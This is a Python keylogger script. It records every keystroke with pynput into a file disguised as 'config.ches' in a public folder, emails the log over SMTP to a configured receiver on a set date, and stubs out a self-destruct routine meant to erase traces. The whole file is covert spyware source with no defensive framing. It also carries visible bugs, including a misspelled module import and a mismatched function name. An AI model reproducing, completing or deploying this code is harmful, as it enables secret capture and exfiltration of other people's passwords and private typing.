import smptlib, ssl
from datetime import date
from pynput import keyboard 
from email.mime.text import MIMEText


file_path = 'C:\\Users\Public\\Documents\\config.ches'

#Information for send_email()
send_date = '' #The date to send the file with the key loggings
port = 465 #for SSL
smtp_server = ''
smtp_pass = '' 
sender = '' 
receiver = ''

#This is the function to send the file via email
def send_email():
    context = ssl.create_default_context()
    try:
        server = smtplib.SMTP(smtp_server, port)
        server.starttls(context = context) #We secure the connection here
        server.login(sender,smtp_pass) #Here is the user and password of the smtp server
        #We send the file in the next piece of code
        the_file = open(file_path,'rt')
        m = the_file.read()
        m = MIMEText(m)
        server.sendmail(sender,receiver,m)
    except:
        pass
    finally:
        #Remember always to close the file and the connection to the smtp server
        server.quit()
        the_file.close()
        
def auto_destro():
    pass #I'll work on this later

#Every time a key is hit the script will call this function
def on_press(key):
    try:
        f = open(file_path,'a') 
        if str(key) == 'Key.space':
            f.write(' ')
        elif str(key) == 'Key.enter':
            f.write('\n')
        else:
            f.write(key.char)
        f.close()
    except:
        f.close() 

#check the date. If the date is the one that the user set the script will launch send_email() and auto_destroy() to erase everything
today = str(date.today())
if today == send_date:
    try:
        send_email()
        auto_destroy()
    except:
        pass        
else:
    #Here we initialize the thread of the keyboard listener
    with keyboard.Listener(on_press = on_press) as listener:
        listener.join()
